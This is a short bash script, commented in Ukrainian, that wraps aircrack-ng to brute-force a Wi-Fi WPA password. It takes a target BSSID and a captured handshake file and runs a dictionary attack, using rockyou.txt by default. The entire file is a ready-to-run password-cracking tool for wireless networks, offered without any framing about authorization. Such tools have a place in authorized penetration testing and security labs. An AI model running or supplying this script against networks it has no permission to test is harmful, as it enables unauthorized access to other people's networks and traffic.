#!/usr/bin/env bash
# Підбір пароля Wi-Fi до захопленого handshake за словником (aircrack-ng).
#
# Використання:
#   ./crack.sh <BSSID> <файл.cap> [словник]
# Приклади:
#   ./crack.sh AA:BB:CC:DD:EE:FF handshake-01.cap demo_wordlist.txt
#   ./crack.sh AA:BB:CC:DD:EE:FF handshake-01.cap /usr/share/wordlists/rockyou.txt
set -euo pipefail

BSSID="${1:?Вкажи BSSID точки доступу}"
CAP="${2:?Вкажи файл захоплення, напр. handshake-01.cap}"
WORDLIST="${3:-/usr/share/wordlists/rockyou.txt}"

if [[ "$WORDLIST" == *.gz && ! -f "${WORDLIST%.gz}" ]]; then
  echo "[*] Розпаковую словник $WORDLIST ..."
  gunzip -k "$WORDLIST"
  WORDLIST="${WORDLIST%.gz}"
fi

if [[ ! -f "$CAP" ]]; then
  echo "Файл $CAP не знайдено." >&2
  exit 1
fi
if [[ ! -f "$WORDLIST" ]]; then
  echo "Словник $WORDLIST не знайдено." >&2
  exit 1
fi

echo "[*] Підбираю пароль для $BSSID зі словника $WORDLIST ..."
aircrack-ng -w "$WORDLIST" -b "$BSSID" "$CAP"
